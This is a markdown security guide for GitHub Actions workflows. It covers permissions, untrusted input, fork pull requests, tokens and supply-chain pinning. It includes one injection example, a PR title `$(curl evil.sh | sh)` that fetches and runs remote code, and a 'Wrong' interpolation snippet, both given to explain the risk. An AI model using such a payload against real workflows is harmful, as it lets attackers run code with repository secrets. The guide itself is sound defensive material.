# Security

The threat model for a public or dependency-consumed repo: a malicious PR (from
a fork), a compromised third-party action, or a leaked token. Every rule here
closes one of those.

## Permissions — deny by default

- Top-level `permissions: {}` in every workflow. This zeroes the `GITHUB_TOKEN`
  scopes for all jobs.
- Each job re-grants only what it needs, and `read` unless it writes:

  ```yaml
  jobs:
    test:
      permissions:
        contents: read
    release:
      permissions:
        contents: write # only the job that cuts the release
  ```

- A job that needs no token at all (pure lint on already-checked-out code) can
  keep `{}` — don't grant `contents: read` reflexively, though checkout of a
  private repo does need it.

## Untrusted input — never interpolate into a shell

`${{ ... }}` expressions are substituted into the script **before** the shell
runs, so a PR titled `$(curl evil.sh | sh)` becomes a command. This applies to
`github.event.pull_request.title`, `.body`, `.head.ref` (branch name),
`github.event.head_commit.message`, issue/comment bodies, and any other
attacker-controlled field.

Wrong:

```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

Right — through the environment, quoted:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

The env value is set by the runner, not the shell parser, so it can't break out.

## Fork PRs — `pull_request_target` and `workflow_run`

- `pull_request` from a fork runs with a **read-only** token and **no secrets**.
  That's the safe default — keep it.
- `pull_request_target` runs in the **base** repo context: full token, secrets
  available, but it checks out the _base_ ref by default. It exists for labeling
  bots and similar. **Never** `actions/checkout` the PR head ref, and never run
  the PR's code (build, test, install scripts, `npm ci` with lifecycle scripts)
  in that context — that's remote code execution with your secrets.
- `workflow_run` has the same danger surface (runs after another workflow, with
  full context). Same rule: don't execute untrusted code.
- If a fork PR genuinely needs secrets (e.g. a deploy preview), use a
  `pull_request` job that uploads an artifact, then a separate
  `workflow_run`/`pull_request_target` job that consumes the _artifact_ (data,
  not code) with the secret.

## Tokens

- `GITHUB_TOKEN` (`${{ github.token }}`) over a PAT. It's scoped per-workflow,
  expires with the run, and shows in the audit log.
- If cross-repo access is unavoidable, use a **GitHub App installation token**
  (short-lived, scoped) — not a classic PAT sitting in secrets forever.
- `persist-credentials: false` on `actions/checkout` unless a later step needs to
  push — it stops the token being written to `.git/config` where any subsequent
  step (or malicious dep) can read it.
- Never `echo` a secret, never pass one as a `with:` input to an unaudited
  third-party action, reference secrets only in the job that needs them.

## Supply chain

- SHA-pin third-party actions (see structure.md). Dependabot on the
  `github-actions` ecosystem keeps them current.
- `actionlint` and `zizmor` run in CI on `.github/**` changes;
  `zizmor --persona=regular` is the baseline. Treat findings as blocking.
- Review the diff of a Dependabot action bump like any other dependency — a SHA
  bump is a code change.
